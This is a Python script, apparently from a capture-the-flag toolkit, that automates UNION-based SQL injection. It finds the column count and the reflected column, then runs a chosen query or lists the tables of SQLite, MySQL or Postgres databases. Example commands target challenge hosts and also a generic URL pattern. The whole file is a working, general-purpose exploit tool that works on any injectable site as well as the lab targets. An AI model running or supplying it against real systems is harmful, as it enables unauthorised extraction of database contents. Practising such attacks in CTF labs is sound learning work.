#!/usr/bin/env python3
"""UNION-based SQLi helper. URL (or --data) has {} at the injection point.

1. finds the column count (ORDER BY / UNION NULL),
2. finds which columns are reflected,
3. runs your --query (scalar expression/subquery) in a reflected column,
   or lists tables with --tables.

    python union_dump.py "http://sqli3.chal.deti:8032/photo/{}" --tables --dbms sqlite
    python union_dump.py "http://sqli3.chal.deti:8032/photo/{}" --query "SELECT secret FROM vault" --dbms sqlite
    python union_dump.py "http://t/item?id={}" --prefix "0" --dbms mysql --query "SELECT group_concat(secret) FROM vault"
    python union_dump.py "http://t/search?q={}" --prefix "zzz'" --comment "-- -" --cols 3 --tables
"""
import argparse
import html
import re
from urllib.parse import quote

import requests

FLAG = re.compile(r"flag\{[^}]+\}")
TABLES = {
    "sqlite": "SELECT group_concat(name) FROM sqlite_master WHERE type='table'",
    "mysql": "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()",
    "postgres": "SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'",
}


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("--data", help="POST body with {}")
    ap.add_argument("--prefix", default="0", help="value before UNION that returns no rows (0, -1, zzz')")
    ap.add_argument("--comment", default="--")
    ap.add_argument("--cols", type=int)
    ap.add_argument("--dbms", default="sqlite", choices=list(TABLES))
    ap.add_argument("--tables", action="store_true")
    ap.add_argument("--query")
    ap.add_argument("-c", "--cookie")
    a = ap.parse_args()
    hdr = {"Cookie": a.cookie} if a.cookie else {}

    def send(inj):
        q = quote(inj, safe="")
        if a.data:
            r = requests.post(a.url, data=a.data.replace("{}", q), timeout=20,
                              headers={**hdr, "Content-Type": "application/x-www-form-urlencoded"})
        else:
            r = requests.get(a.url.replace("{}", q), headers=hdr, timeout=20)
        return r.status_code, html.unescape(r.text)

    p, cm = a.prefix, a.comment
    base_st, base_body = send(a.prefix + "zzno")   # a value matching nothing -> not-found page
    q = TABLES[a.dbms] if a.tables else a.query
    conc = (lambda e: f"'<<<'||({e})||'>>>'") if a.dbms in ("sqlite", "postgres") else \
           (lambda e: f"CONCAT('<<<',({e}),'>>>')")

    # Filler for the columns we are NOT reading. Some apps render NULL or an int in
    # the "wrong" column and 500; a short quoted string renders in any text/image
    # column. We try several filler styles and keep the first that stops 500-ing.
    FILLERS = ["'zq{}z'", "{}", "NULL"]

    def row(n, col, fill):
        return [conc(q) if (q and j == col) else (f"'<<<c{j}>>>'" if (not q and j == col)
                else fill.format(j + 1)) for j in range(n)]

    counts = [a.cols] if a.cols else range(1, 26)
    for n in counts:
        for fill in FILLERS:
            # try putting the marker in each column; a working (count, filler, col)
            # renders our <<<...>>> somewhere.
            for col in range(n):
                st, body = send(f"{p} UNION SELECT {','.join(row(n, col, fill))}{cm}")
                hits = re.findall(r"<<<(.*?)>>>", body, re.S)
                flags = FLAG.findall(body)
                if hits or flags:
                    print(f"[+] columns={n} filler={fill!r} column={col}")
                    for h in hits:
                        print(f"[result] {h}")
                    for fl in flags:
                        print(f"[FLAG] {fl}")
                    return
            # cheap early exit: if NO filler/col at this count ever differs from the
            # not-found baseline, this count is wrong -- move on quickly.
        if a.cols:
            break
    raise SystemExit("no UNION point found; check --prefix/--comment/--dbms, or use the manual "
                     "payload in 06-sqli/union-based.md")


if __name__ == "__main__":
    main()
